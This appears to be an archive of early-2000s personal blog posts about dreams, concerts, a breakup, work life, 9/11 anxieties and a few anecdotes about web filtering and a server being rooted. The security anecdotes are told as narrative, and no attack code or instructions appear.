                <p>So <a href='http://www.securecomputing.com/index.cfm?sKey=86#cs'>SmartFilter</a> is apparently blocking my site <a href='http://www.nata2.org'>nata2.org</a>. My friend sent me this message:<br /> <i>This site (http://www.nata2.org/) is categorized as: 'Crim. Skills' and has been blocked by SmartFilter. Please contact Data Security at xxx-xxx-xxxx if you have a business need to access this site.</i><br /><br />I am such a criminal. If you want to know how to <a href='http://nata2.info/?path=geek/textfiles&text=bong.txt'>make a bong</a>, or <a href='http://nata2.info/?path=geek/textfiles&text=homemade_pepper_spray.txt'>how to make pepper spray</a>, or <a href='http://nata2.info/?path=geek/textfiles&text=kill_parents.txt'>kill your parents</a>, or <a href='http://nata2.info/?path=geek/textfiles&text=mhbomb.txt'>how to make a bomb</a>. Obviously if I have all of the information availble on a related web site - I must be a criminal skills site. I should be scared I suppose. Especially in <a href='http://slashdot.org/article.pl?sid=02/01/31/1820238'>this</a> climate. I imagine soon I will be questioned about &#8220;terrorism&#8221; and how I am involved. Too bad I am not a terrorist. well not really too bad. but I think you understand what I am trying to say.. eeep</p>

These kids were really really good. Amazing things they could do. Of course, my favorite is the popping and locking, which doesn&#8217;t seem to be as popular among the kids. alas.. it also makes me feel inadequate hanging around with people who are incredible break dancers. heh. it was funny to see.</p>

                <p>So I often have computer dreams. I dream of editing something in VI or Pico. I dream of installing content managment systems. I dream of mostly software. Last night I dreamt of trying to install a motherboard ethernet card into another motherboard&#8230; so I had to unsolder everything out and resolder it in. heh. I don&#8217;t know hardware that well so it was hard. <br />The other dream I had was that the U.S. attacked china in order to start a war. It prompted china to engage in a nuclear strike - thus ending all civilization. that dream wasn&#8217;t as fun. <br />this weekend was crazy. I am not sure if it was a good time. I don&#8217;t know what to think about anything.. arrggghh.. whatever.. hehe</p>

When I break it I usually boot <a href='http://www.qnx.com'>QNX 6.1</a> off of a CD so I can have email and web access. however I was interested in using AIM so I quickly downloaded an AIM client for QNX. It happens to be a text only client so its kinda like old style ircii. It was all going great untili started core dumping randomly all day. I couldn&#8217;t figure it out, until a friend messaged me and was like.. Everytime I message you from my other client you sign off. So I guess my client didn&#8217;t like his buddy name. heh. here is the log:<br /></p>

                <p>Well. Tonight I slept. Well I went to a bar after work with coworkers got a little tippsy and ate a hamburger.. came home and slept till eleven. and then negated any sleep by staying up way late. I then watched a bunch of TV and rotted my mind. Sometimes.. I feel like contirbuting to the delinquency of my palm pilot. So I keep looking at all the nifty INFOSEC stuff available right now. Like all the jobs and such. it makes me wonder. It sucks(well not really) though.. cuz my curretn job is fun and cool - if it wasn&#8217;t I would totally be on the INFOSEC bandwagen. If anyone is interested: the <a href='http://www.fbi.gov'>fbi</a> is looking for a few good people. <b>HA</b>. You should apply.</p>

                <p>Last night I went out to this club and saw some of the strangest and most entertaining performances of my short stay in lovely chicago. It was a &#8220;Battle Royal&#8221; of sorts between two &#8220;laptronica&#8221; teams. Each team had a tellytubby to fight out the matchs wrestling-style. The music was bomb and the teams were funny shit. I have never in all my years seen something so amusing. heh<br /><br />I also managed to get some connections with the chicago underground &#8220;geek&#8221; scene. Hopefully that will work out. I would love to play computer with a bunch of people who woiuld also like to play computer. <br />On a another not related note. I may have to goto columbus, OH to fix some shit. argggh.. damn console access</p>

                <p>Once again, gravity is really having its way with me. It has tripped me and flung me about for the last time. I vow to stand up to gravity and not let it boss me around. I don&#8217;t care if it is bigger than me. It is not fair that it has to oppress me so. I mean.. wtf.. <br /><br />So about 8 months ago I embedded &#8220;For Great Justice&#8221; into my IE titlebar via a quick registry hack. This wouldn&#8217;t be so bad, but it leads me to believe that everyone is really cool. I will browse to some lame site and be like &#8220;Whoa.. they are nerds as well - sweet.&#8221; Only to realize that I dupped myself again. damn.. always being duped.. heh.</p>

                <p>So this weekend I went to an awesome juggling convention. It was called Madfest(<b>Mad</b>ison <b>Fest</b>ival). The jugglers there are some of the best in the entire world. They are all very nice and are quite talented.The show was incredible, the were at least 5 professional juggling acts and many more really great amateur acts. The MC was a lot better than QUad Cities and the humor was great. It was probably the best juggling show I have ever seen.<br /><br />well I hope everyone has a good Marin Luther King, jr. day.</p>

                <p>So tonight I went out wth a bunch of friends to game works in schaumberg. It was quite fun. had an OK hamburger, paid too much for that and a beer. played $35 dollars worth of games in 1.5 hours and then rode in a car going buck 20 down 90, only to bring us to a great wine bar where I drank some wine. I don&#8217;t know anything about wine. it seems &#8220;ok&#8221; but it kinda burns my mouth and I usually don&#8217;t like that flavor. whatever. it was fun and I had a good time. maybe someday I will appreciate wine and have a modded out audi. word</p>

                <p>So I went to school with this really nice but very strange young man from colorado. We hung out a little and we had a class together toward the end of last year. He seemed to be the &#8220;typical&#8221; freshman, interested in getting drunk and being &#8220;wierd,&#8221; however.. I have just learned that this young man was arrested for some very strange reasons. Apparently he was helling about lovely money earnin Mount Vernon butt ass anked and decided to buy some candy. The police came and arrested him and apperently also pressed breaking and entering charges against him. hehe. you need to know this kid to realize how wierd this information is. He is quite a trip.

                <p>Tonight I went out with a good friend of mine. it is wierd because they are originally k<em>star&#8217;s friend. but somehow I grafted them over to be my friend as well. They are real nice. I don&#8217;t know how k</em>star doesn it. but she certainly picks god friends. all of her friends are nice. Unfortunantly I got a little ferschnickered tonight and wasn&#8217;t able to be a big help to k<em>star when she called me. Tha made me feel bad. I wish that I was able to be a little more helpful toward her. It is hard right now. because I don&#8217;t know where to throw my hat. I am sure you all understand. I need to goto bed. the room is spinning.<br /><br /> I was messaged this: <a href='ftp://msfe.microsoft.com/outbound/BBerg/'>ftp://msfe.microsoft.com/outbound/BBerg/</a> . so check it out. I am not sure how public or private it is. but it seems interesting. word.</em></p>

Especially the &#8220;wisconson&#8221; college environment. Everyone has a little twang to their speech and they are all big drinkers. I guess that couldbe just college. There were pretty girls there. That is wierd huh. Pretty girls. <br /><br />Today I figured something rather pivitol out.<br /><br /> Oh. And check out the new <a href='http://www.harperreed.org'>harperreed.org</a>. I finished and released it tonight. Full XHTML compliant for quick loading.

I went to a going away party for one of my coworkers and then I went out with some other coorkers and then I went out with my firends and got dinner. We then went to a bunch of bars and such.. all night long.. I think I went to seven bars in total. it was fun.<br /><br />I am not sad right now. but I am still scared.

                <p>Today a dumb ass cracker rooted one of my boxes. It was a cobalt RaQ and was running sendmail and an old version of sshd, so it &#8220;deserved it.&#8221; I had done a lot to make it more secure, however the default web admin tools that my clients use relied on sendmail and telnet and such. it was super sketchy. So anyway, the reason I say that it was a dumb ass cracker, was because they tried to install a rootkit on the box.. and fucked it all up. The were not smooth at all. I was under the assumption that a rootkit was to hide the fact tah tthe box had been rooted from the sysadmins&#8230; so the installation should be smooth&#8230; for instance.. if this box got rooted.. and had a good implementation of a root kit installed.. I wouldn&#8217;t know.. and suddenly I woul dbe part of a massive DDOS against some poor geek. Well whatever. it was a learning experience.. I hope it was for some poor hacker as well.. especially thanks to the people at shellyeah.org for providing quicka nd easy shells to login to so that fuxoring some poor saps &#8220;insecure&#8221; box is tha much easier.. and also thanks goes to media-0.com whose box was also rooted(i am assuming) for providing an easy place for said hacker to connect to my box with.. Well.. hoepfully I don&#8217;t lose all my clients and be stuck with a massive hosting bill and have to sell a kidney.. lets hope shall we.. ready&#8230;</p>

                <p>i need to post a link.. since I was doing so well awhile ago and now I am doing poorly.. so here goes:<br /><br /> OK, so I play a game called <a href='http://www.astraware.com/palm/bejeweled/'>bejeweled</a> on my palm pilot to and from work everyday. My father got a score of 99940 and we were all very impressed.. except my girlfriend who took it like a personal challenge to beat my father into submission.. so she played and played and played.. and finally 107550. she did it.. but I was a dumb-ass and put my name instead of hers.. so now she will have to take another three hours and do it again.. hehe.. <br />so anyway I found the original game. It is called diamond mind and is available <a href='http://www.popcap.com/'>here</a>. So check it out and see what caused my family to develop nervous twitches&#8230;</p>

                <p>I like buildings. When I was a child, my father subscribed to Architectural Digest. I used to read and look at the pictures of incredible architectural feats. I always imagined living in a place that had buildings that were nice. I finally found a building that is very nice. It is the <a href='http://www.dims.net/bm/building2.jpg'>R.R. donnelley building</a>. Is a quite modern and has a neat lighting scheme. Inside it has incredible art and uses a lot of pretty black and white marble(i think).</p>

                <p>Today is kinda tough. I didn&#8217;t sleep well last night.. maybe it had to do with me staying up until all hours of the morning. It is still hard, I don&#8217;t know what I expect? I mean it has barely been two days since it happened. I guess I expect a drastic change.. like I will suddenly get over her. however.. I know that is impossible. I look at all the pictures I have, all the letters and I am scared to read them.. to gaze at them.. I know it will hurt.. I really don&#8217;t understand..<br /><br /> On a different not, I feel kinda lame talking to this webpage. especially when everyone has the oppurtunity to look at it. whatever&#8230; I dare you to look at it..</p>

                <p>today was hard. I was able to hold up. Work was ok. I am trying to decide a hobby. maybe direct TV hacking.. maybe console stuff.. maybe getting a no region dvd. . I am thinking about drowning my sorrows in technology(something I do really good) and buying a laptop. hmm.. but I need one with UXGA(ahhh 1600x1200), however that shit is expensive.. I don&#8217;t want to pay $2500 for a freaking computer(ha ha) <br /><br /> anyway. I am doing a lot better. it is still really hard. I look around my room and notice all the pictures all the letters, all the stuff that relates to her. I know it is silly. I mean she is just not my girlfriend.. but all that stuff has some resemblence(at least for now) of what was once.. and what isn&#8217;t now.. however - I don&#8217;t think that it will be like that for long. she is still my best friend and will always be (i hope). I htink tha time will help.. and like a good friend said - it only matters on what you do with that time&#8230; <br /> <br /> I hope to make a palm game.. hehe..</p>

                <p>today, my girlfriend and I have decided to break up. It wasn&#8217;t the best of situations for each other&#8230;. So after fourteen wonderful months together we are separating amicably. it was the only choice that allowed for us to maintain health and happiness. at least in our current situation. <br /><br /> However.. now I am a little lost.. I don&#8217;t know what to do or to say.. I type these words and fear a numbness that could quickly approach. How come love doesn&#8217;t conquer all.. <br /><br /> I type these words and I wish that things were quickly different. but whenever I wish that I know that to wish that is a bad thing. It is hard now. however I know it will be easier soon. I will sleep, get up, go to work, go home, eat, and repeat. I will go out with friends. I will hang out and meet new people. I will get back into a pattern. I just want something I cannot have right now. I need to realize also that I still have my friendship with her. that she is still my best friend. I haven&#8217;t lost anything really. I mean.. really</p>

                <p>Ha..<br /> Well after numerous people have asked.. I did have a rough time lately. however I am ok now. I was just sad for a breif period and everyone left. I didn&#8217;t have anyone to reflect off of, or to talk to, so I used the wonderful internet and the lovely &#8220;blog&#8221; to be my emotional reflection pool. thanks for the support.</p>

                <p>Yesterday was kinnera&#8217;s birthday. Lets all say happy Birthday to her. <br /> Tonight I went to a shoddy rock show and saw a guy who used to play with the smashing pumpkins. It was wierd because members of the &#8220;pumpkins&#8221; were at the show. Often when I see famous people it takes me a little while t figure out that they are real. I guess that is what I get for living in a fantasy world. Well gnight all. Happy Birthday to Kinnera..</p>

                <p>Recently, I experienced something that could be described as a losing of faith. When I would it back and relax, I would not be able to relax - a sort of strife was happeneing in my head. However, recently I made peace with the contentious point and now I have nothing which is causing undesireables. Lucky for me. I guess I need to remember that it is important not to plan to far ahead when dealing with others, and that I should always live day by day - not week by week or month by month.</p>

                <p>Today is nerve racking. My brother is driving to california to begin what could be his career. He is actually going to go an dbe a commercial diver. He starts the vcational commercial diving achool on the 7th of january. It is pretty exciting. It reflects on me as being grown up. I don&#8217;t want to grow up. <br /><br />Things are also hard right now. I think that my relationship is slipping. The distance thing is wearing on us. We are trying hard.. but nerves are frazzled and it is not as fun as it once was - feelinged get hurt, emotions get trampled. Love is supposed to win. It seems like it is prevailing, so lets hope. <br />Work is the same as it always has been. I wish I was properly titled. I wish I didn&#8217;t have to work. I wish I had something to do tonight rather than sit aronud my apartment with no friends. Sometimes I feel very sorry for myself, then I realize I am feeling sorry for myself and then I feel silly. But tonight, I feel sorry for myself and all I want is a hug. a big big hug. but I don&#8217;t have anyone around to give one to me. my family all left, none of my roomates are home. drat.<br /> I hate it when I want to sleep just to pass time. it disgusts me. I need to go out. I need to meet people. I need to figure out how to be healthier. how to surround myself with people. not sit here and feel sorry for myself. <br /> argggghhhhhh</p>

                <p>So today my parents came to visit me. How nice it is to finally have something to do. My girlfriend is away again - off to see her parents. Alas, I wish I could be with her. Today we walked around, at at shoddy resturants and went and saw one of the best movies of all time. <b>Lord Of The Rings</b>. Boy oh Boy was it ever entertaining. It was very long, but I was able to handle it - in fact everyone was able to handle it. It was the most enthraling three hour movie I have ever seen. It was simply amazing. the effects, the cinematography and all the nonsense. It ruled. Oh, and I am addicted to saying way. like that is way cool or that is way harsh. arghh it is annoying.. annoying like not gettin got see the blueman group with ALL of my loved ones.. alas&#8230;</p>

                <p>I was reading through a bunch of sites and I noticed some quite interesting movements in the &#8220;world.&#8221; First off, the <a href='http://www.iht.com/articles/42521.html'>incredible epiphany</a> that two thrids of the world thinks that the U.S. is brought the terror onto itself. Also, in a very scary move, <a href='http://www.washingtontimes.com/national/20011221-95780908.htm'>China</a> has apparently been subtly supporting the al-Qaeda. Whoa. I hope bush does not take on the big red. Oh, and I guess the FBI and CIA are looking into a domestic threat of tactical <a href='http://www.upi.com/view.cfm?StoryID=20122001-044906-9007r'>nukes</a>, and they think that <a href='http://www.upi.com/view.cfm?StoryID=20122001-044449-5310r'>nukes me already be here</a>. And in local new - <a href='http://www.chicagotribune.com/news/local/chi-0112210378dec21.story?coll=chi%2Dnews%2Dhed'>chicago</a> is number one in murder for the country. Rule!! I feel so safe.</p>

                <p>Sometimes, just when I think I understand something it explodes and blows up in my face.. making me look silly and dumb. One of those things is corporate culture. I think it is very similar to the rings on a tree, but rather than age - it maps how slow to change the corporation is. Take my <a href='http://www.worldbook.com'>institution</a>, it is a very old and rather successful company. Ithas maintained a profit on the web and uses a &#8220;good&#8221; business model. It was pioneered by <a href='http://www.IBM.com'>IBM</a> and managed internally. We are having to face the internet as everyother company has had to face it before us. We need to detirmine what our priorities are and what needs to exist in out &#8220;world.&#8221; The problem is, is that the &#8220;new&#8221; business of the interenet is fundamentally incompatible with WB&#8217;s business past. So we are facing the end of a paradigm. We are ending one of the concentric tree rings. We are starting another. but the corporate culture is rejecting this change like a stolen kidney. It is tough. No one wants to play the &#8220;internet&#8221; game. They all want to &#8220;relax.&#8221; <br />i got bored of ranting and started finding a WYSIWYG editor for this weblog.. alas&#8230; I will be back I imagine</p>

                <p>Some people I am currently working with jsut told me about a crazy and very interesting genre of work. It is the <a href='http://www.psywarrior.com'>PSYOPS</a>. The propaganda and psychological movement behind the government and war. It seems very very cool. I also have been thinking recently about security and what I want to do when I grow up. I don&#8217;t know as of yet. Hmm.. maybe be some kind of security consultant&#8230;. it is just that security certainly makes me excited. and I have a whole lot to learn.. and I would have intereaction with people and hopefully not be stuck behind a cube all the time.. so when I am done with worldbook.. maybe that is what I will do&#8230;</p>

                <p>Today I visited another tier one hosting provider. It was nuts. Absolutly nuts. One of the cage facilities had a 300 terabyte tape drive. It looked like a space ship - or a nucular reactor. It was nuts. It probably cost enough to send my entire family to private liberal arts colleges in the midwest :)&#8230;.</p>

                <p>Awhile ago, when I first started dating my girlfriend a friend of mine used to allude to my relationship with her as the weather. He would say &#8220;hey harper, how is the weather&#8221; and per the current situation I would tailor the response. Well, my humble audience: the weather is great. In all situations&#8230; The actual weather and my girlfriend. Eveything is nice and smooth and fun. I enjoy it. It is like 60 degrees out today and It has been like 1.083 years since I started dating k<em>star. weee</em></p>

It is about a crazy man in charge of a video game store, and his antics with really dumb customers. it is very humerous. check <a href='http://www.actsofgord.com/index.html'>it</a> out. oh and it is called acts of <a href='http://www.actsofgord.com/index.html'>gord</a>.</p>

                <p>Oh boy, oh boy. Last night kstar came up and we went to the Britney Spears concert. We sat in our seats and realized that we were surrounded by screaming 13 year olds. It was insanity. <br />O-town opened for her and they were horrible. They had a hip hop part.. they sang the puff daddy song &#8220;wanna be a baller,&#8221; it was funny the only guys who rapped were the &#8220;ethnic&#8221; guys. well I guess that isn&#8217;t funny. it is sad to see such a focus group designed band. man.. if you thought visual basic was bad&#8230;<br /> So then Britney came on. I have to admit - she is an attractive women. I also have to admit that she has a neat stage show. I kept comparing it to madonna in my head, but k<em>star wouldn&#8217;t let me. k was like &#8220;madonna has had 10000 concerts and 11 albums, britney has had nowhere near the number of concerts or albums.&#8221; Which is a good point. the thriteen year olds certainly liked it. And britney flew around and it rained on stage. that was cool. but the kung fu part of madonna&#8217;s show was still better.<br /> anyway, I really love k</em>star.</p>

                <p>So I was walking in DIA heading to my terminal when I noticed a set of &#8220;net terminals.&#8221; I laughed and thought &#8220;how nice, free internet. Now there is a business model that will work.&#8221; I think it was called <a href='http://www.go2net.com'>go2net</a>&#8230; althought io don&#8217;t really remember. All I know is that they used linux and a slow version of netscape 4 and the terminal next to mine kernal panic&#8217;d.. hehe.. <br /> So anyway, I got to my plane, sat down in my seat and we taxied around the tarmack and then we got all iced up and then we got de-iced then iced and then de-iced and then the crew suddenly worked more than 16 hours and needed a break - so we headed back to a terminal. We deplaned and then replaned at 12:30. now this flight was supposed to leave denver at 7:30, we did not take off until 12:50-1:00. I didn&#8217;t arrive in chicago until 4:45 and then I had to wait for baggage until 5:00. I took a cab home and didn&#8217;t get in and ready for bed until after 6:00. Then I got up for work at 8:30. it has been a long day. I only got 2.5 hours of sleep off of a 22.5 hour day. whoops. <br /><br /> on a lighter note, I am going to see britney in a few days&#8230;</p>

                <p>So I listen to metal. I don&#8217;t mean to. It sort of follows me around. I assume it is because metal likes me. I mean, I could barely walk out of the CD store withou tthe entire Iron Maiden Catalog jumping into my pocket. WTF. But, there is a lot to metal I don&#8217;t like - for instance, pantera. WTF. I do not like Pantera. So without further ado I point you to <a href='http://www.buddyhead.com/other/hessian/love/page/'>this</a>(<a href='http://www.buddyhead.com/other/hessian/love/page2/'>part 2</a>) site where they posted a fake personal ad to AOL from a non-existent &#8220;metal-chick.&#8221; It shows the actual depravity of intelligence in and around the metal community.</p>

                <p>So, I had another weird dream. this one was quite scary - not that weird good scary either. Real real scary. Not fun. it went like this: <br /><br /> I was one of the head guys at a mental institution and I was in charge of combating all communicable diseases. So I got an alert of a breakout of this scary disease that turns ordinary people into shape shifters on a killing rampage. <br /><br /> So, as you might imagine - it was my job to combat these &#8220;evil people.&#8221; The symptoms of the disease were sort of clear. The first one was a visible skittishness of the infected individual. The next symptom and I think the scariest was the addition of an eyeball while the person was shape shifted. The eyeball was there because during the rearrangement of flesh on the individuals face, they rendered themselves blind. An example interaction with one of the infected would be like this: <br /><br /> You would be walking towards someone and notice a small blinking eye located in a very strange place (usually on the persons legs or arms) the person would act normal but in the end would attack someone very violently. <br /><br /> Since they were especially violent, you couldn&#8217;t just sedate and cure them, you had to violently murder them and as you can imagine they put up quite the fight. So the dream was basically me running around this crazy house, dealing with panicking insane people and killing violent shape shifters who were infecting and killing our population. In the end of the dream, I was with my expert crack team - fighting the infected and we were attacked by a crazed looking little girl who had armed herself with saw blades and drill bits. It was no fun. So I work myself up and thought about nice things for thirty minutes - until I fell back asleep. ahhh&#8230;</p>

It was quite strange, I met while juggling, a friend of a friends that just happened to be the proprietor of a web site I used to frequent. weird.<br />I also was able to see my girlfriend. Imagine, just 12 months ago I was pineing over her - trying ot get up the courage to ask her out, and now.. hehe.. well.. One</p>

                <p>This past weekend my girlfriend came, it was great. I had a wonderful wonderful time. Another two weeks and it will be one year. A year is a long time, like k<em>star said this morning, &#8220;a year has one of eveything in it.&#8221; I never realized it - but it is true. Together we have been through almost everything. how nice. I enjoy it so so much. Walking last night, we found one of <a href='http://www.usa.canon.com/camcambin/cameras/aps/elph370z.html'>these</a>. It seems to work, and it seems to go for roughly 100 bucks on ebay. hehe.</em></p>

                <p>So. Today has been great so far. My girlfriend is visiting later, I have a BIG meeting and presentation for work in a couple hours. and to top it all off, while I was reading my favorite new source, I noticed <a href='http://slashdot.org/article.pl?sid=01/10/25/1222257&mode=thread&threshold=-1'>this</a> article which linked to my <a href='http://www.audreyhacking.com'>website</a>.

                <p>Last night I went to an incredible show. I saw the Faint, which is a great band out of Omaha. They are a little like the Cure, but a little more upbeat and a little more dancy. It was quite good, the first two bands sucked however&#8230; Then, I met some really cool kids after the show and went down to the smartbar and chilled for awhile. It was nice. I then went to my faorite haunt, and then went to a goth bar. it was a strange night. But I made some new friends. And met some cool people. It was great.</p>

                <p>Today I saw the band Anniversary. They were interesting. Not really as good as I thought. It is weird when you go see a lot of bands that you listen to often ? I feel I know every lick, every lyric and every guitar riff, and when the band does something creative in concert it annoys me. Luckily with bands like modest mouse, the creativity is very solid ? and with built to spill, they were right on. Today is also, coincidentally enough, my eleventh month anniversary with my wonderful and talented girlfriend. Happy eleventh day k<em>star.</em></p>

                <p>First, I really miss block breaks. I am horribly stuck. I wish my company was a more liberal dot com. I wish it was 99-2000 and I was a high profile consultant. I really wish that the company I work for was interested in making the employees happy. WHich they seemingly arn&#8217;t. It seems that profit is the key, but even when I can identify things which are easy and would save money - getting them approved would cost more money then the initial savings. It is like pulling teeth. Very annoying and quite painful. Sometimes I wish a small consulting firm would snatch me up and I would leave this awful place. Well not quite, I do like my job, it is fun, it is interesting. But I know that their are other places that provide better benefits, better pay, free soda and where the developers of the web site have more control in what happens to the website. arghh.. well I think I will go and do work now :). I really do like it - just sometimes I get frustrated. Secondly, well I forgot&#8230;</p>

Very much a bad situation. 

&lt;p&gt;Look at what we have so far:&lt;br /&gt;&lt;br /&gt;
&lt;ul&gt;
&lt;li&gt;&quot;We (members of the german army) have been put on alert, people are being revoked from holiday, all system/material checked, no talk policy. &quot; (sid=21542&amp;cid=2277927)
 
&lt;li&gt;&quot;The US military is on alert. For security reasons I can&apos;t post more details, but the 82nd airborne division has been told to suit up and according to one report one unit is already in the air, though they&apos;re not sure where they&apos;ll be landing yet. Speculation is that they&apos;ll land at a known friendly base in the middle east and then decide where to go from there. &quot; (sid=21542&amp;cid=2277977)

&lt;li&gt;&quot;I email I guy in the navy and he says he?s going out to the Atlantic right now&quot; (friend of mine)

&lt;li&gt;&quot;think about what our lives will be like after this...i wonder how much more freedom will be taken away from us, in order to &apos;make america safe again&apos;&quot; (another friend)
&lt;/ul&gt;</pre><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;p&gt;I feel scared like a little kid when I think of what a knee jerk reaction to this could cause. If this level of organization is available ? they must be ready for a reaction. And what could that be? 

&lt;p&gt;I hope that Bush is good at being a president for the first time when he reacts to this. I imagine his flight from Florida to ?Washington DC? is really the governments chance to remove him from the scene. This is important. With the president removed, the military going to the mideast, all western European countries are mobilizing their militaries ? ready them for attack. We do not need war. We need to be accountable for our actions ? just like we ask the ?attackers? to be.

&lt;p&gt;It is important to not jump to conclusions, I heard many a person whom I thought was open minded and not a hatemonger say racist things about Palestinians and Arabic people ALREADY. This is not acceptable. We need to be careful and not attack a people for the mistakes and attacks of someone of there ethnicity. </pre>

                <p>So my girlfriend and myself have been dating 10 months. That is a real long time for me. I mean it is nothing compared to some lucky peoples marriage, but it is like 80% of a year, 304 days, a little over 1 million seconds(i think <b>:)</b>). So anyway, i am excited to go and see her at college. Hopefully all goes well and i get to go visit. I miss her terribly. My only solace is in my second best friend, my cell phone. I am waiting here in anticipation for a long drive. Waiting&#8230; Waiting&#8230;</p>

Doug(if that is his name) was a good guitar player. The audience was OK, Except for some assholes who were harrasing a simple drunk man. I was sad for him. But eventually the dumbasses were kicked out.. weee..</p>

                <p>So ihad this very strange dream. I dremt that lamprey like fish had started to colonize humans. They would come and dig themselves down your throat and when you breathed they would just pass the air through them and you &#8220;wouldn&#8217;t&#8221; notice. I mean you would notice but you were still able to breathe &#8220;normally.&#8221; Well anyway, the lampreys were attaching themselves to humans and a regiment was created to purge yourself of the lamprey. What you had to do is first pull the one out of your throat. Since it is never comfortable to have anything forced down your throat, this was an uncomfortable exercise. So you had to grab the head of the lamprey and pull as hard as you could. Eventually they developed tongs to grab the lampreys. After you got the big lamprey out of your throat, you ahd to force yourself to laugh or chuckle, because that rolled your stomach muscles in a strange fashion - this killed the babies and eggs the larger lamprey laid. They would then release a chemical which would make your stomach reject them, and you would puke small clear lampreys. Anyway, this dream was wierd and i hope it never comes true&#8230;</p>

I kinda liked it because i was supposed to like it - according to the code of computer nerd. But now i am starting to get more into it. I just saw <a href='http://www.bloodthemovie.com'>blood</a> and it was really good. It was by the guys who did <b>ghost in the shell</b>, which i really enjoy. I am hopeing to watch and discover more anime. and maybe just maybe i will convince others that it is fun.. i guess i need a dvd player&#8230;</p>

                <p>So I saw madonna the other night, and i would like to say that she is very good in concert. I think that she may have put on the best concert i have ever seen(i have seen a few). She had great choreography, and incredible sets and costumes. It was quite spectacular. I would love to go again, and i have been scouring ebay for more tickets. The only problem was, that our tickets weren&#8217;t exactly &#8220;great.&#8221; I wish they had been, i think Kinnera would have had a better time.. well anyway.</p>

                <p>I am sitting here waiting for this program i wrote that parses log files to finish, and reading news online. I am trying hard not to read anything about Bush. Cuz he scares the hell out of me. Headlines lie &#8220;Bush states that the US WILL withdraw from missile treaty&#8221; and &#8220;Bush appoints Air Force Man to joint chiefs of staff&#8221; and other scary cold warish things. I think that the sign of a bad president is when things DO happen. At least with clinton, when we were on the verge of war, it was mostly the other countries fault. Now, we are building are war machine. WTF. I don&#8217;t want to try and survive a war, i don&#8217;t want to have to deal with that. The US is not the only World Power now. And bush is acting as though the red bastards are coming. But rather than acting nice like clinton he is inviting an attack, and then the conservatives(bush and his lot, not the cool guys) will say &#8220;i told you so.&#8221; I hope you youngins are planning to run&#8230;</p>

                <p>So the other day I was on TV. Well not really.. maybe.. I went to a Filming of the <a href='http://jennyjones.warnerbros.com/'>Jenny Jones</a> show. It was a riot. i laughed very very hard. Kinnera somehow got tickets, and at first i didn&#8217;t know what to think. But i was immediatly calmed when someguy yelled &#8220;slut&#8221; randomly in the beginning. I knew i was among friends. WHat a piece of work most of the people were. I did learn something though, i learned that the audience is what the show is all about. The people on stage are just there as excuses for the audience to act crazy and disgustingly.</p>

                <p>So i sent off my server today. It was wierd just packing it in a box and sending it to someone whom i have never met or really talked to a lot. The place that is cohostin git seems kinda sketchy, but at the same time also seems really cool. They are a backbone provider for Ohio State, and the State of Ohio :)&#8230; so the bandwidth will be good - and i will be hooked pretty much directly on the backbone.. So i guess we shall see if it gets up ok. Did i ever mention that UPS rules?</p>

So i finally(yea right) decided on a good selection. i hope to burn it soon. I love mix tapes. i thought about a <b><i>mix tape algorithm</i></b> but i decided against it :)</p>

                <p>Man.. i don&#8217;t know whats going on. I had the wierdest dreams recently. both of them involved the &#8220;weather.&#8221; In one i was walking from cedar rapids to Mt. Vernon, and i was following a tornado. So everything was destroyed&#8230; then when i got to cornell, the tornado had somehow turned all of the &#8220;jocks&#8221; into vampires&#8230; it was really funny. it wasn&#8217;t just jocks persay, but that is all i remember as now. we searched far and wide for pool cues to kill vampires with.. to no avail.. also a bunch of women whom i have never seen went to cornell and were excellent vampire killers. i think its wierd that in all vampire tales.. the protaginist is the only one who fully understands that the vampires are vampires.. <br />the other dream was different.. and i am not gonig to talk about it here.</p>

                <p>I have decided that the reason the 3rd of july is so big is that chicago is a working city. a city where eveyone get the 4th off, but most don&#8217;t have th 5th off. so they go an party on the 3rd - cuz they don&#8217;t have to get up the next they. But they don&#8217;t want to on the 4th cuz they have to get up on the 5th. this is in contrast to colorado where it was originally agri. based. so the 4th meant going to the fair and showing your goods. it was important adn as much part of you job as the actual work. so that is why in colorado the 4th is still on the 4th rather than on the third. <br /> this is what i thought about last night whilst watching the fireworks.<br />on another note. i am gunna make it so you can comment on these, and so it only shows the top ten. hehe. i love weblogs&#8230;</p>

                <p>So i was reading the New Yorker Magazine when i noticed that all of the cartoons were making fun of .coms failing. And then i noticed that all my computer nerd friends who aren&#8217;t working for an insurance company or working for a hardcore company are getting fired and not getting jobs. All my friends that are graduating are not getting hired. I have a job at a non-tech .com, and many of my friends are getting offered small time contract work. What is the deal. I appocalypse finally upon us. Why has G.W. done this too us(j/k). Why god! Why!</p>

                <p>Hey yall, I have been reading some books for the last couple of months that deal with the after effects of imperialism. Why is it that the nature of humanity is to destroy/assimilate culture and life of others. I find this disturbing, but mostly because it is an easy racket to get involved in. Is it hard, to maintain a cultural identity within the pseudo &#8220;melting pot&#8221; of the U.S.</p>

                <p>Hip Hop. Oh yes.. <br /> Well, another christmas has gone and went.. and to think i just started acknowledging the year 200 last month.. heh.. its almost 2k1. I think it is funny how time flys. i mean i just started school almost 4 years ago.. when i was like 19.. now as i approach my 23rd birthday, i realize that their isn&#8217;t really a difference between being 23 and being 45. it is afterall, just time. <br /> I went to the dentist today, and during the parts that were uncomfortable i meditated. I have never meditated before, but i just forced myself to be calm. i relaxed.. even though i wasn&#8217;t in a physical state of relaxation. i made my mind separte from the body that was holding me down.. i got frustrated however, because i wanted to discuss some matters with the dentist, but i was unable to talk.. so i just hung out in my head.. haha.. i am turning into something. i think the ability to push your feelings inward, and think about them is interesting. it is also soo dangerous.. luckly.. the feelings i am talking about are of a physical nature.. not a emotional nature.. i need to get those feelings out..<br /> word</p>

I wish my family didn&#8217;t celebrate christmas, cuz we don&#8217;t believe in christ. so maybe just call it winter or something like that. I am halfway done with my senior year of college.. wierd. i have been doing my new resume, and am excited to soon be employed. weee&#8230; everything else is going well. I am dating a really cool girl and my friends are fun. I am doing some neat web stuff and am excited for myself right now.. i just need more money and a laptop&#8230; heh</p>

                <p>This week has been nuts. I had a very nice time in class. It has been fun. I love to program. My company is insane, i went in and will get paid soon. weeee. I got a cool new belt. <br /> I think the most consequential part of the last week has been my relationship with kinnera. It has been a very exciting time. I spend a lot of time with her, and we have had the oppurtunity to share some special things with one another. It is real nice. I hope things keep as they are. Eveyday seems to get better and better.. an apex hopefully isn&#8217;t near. well word&#8230;</p>
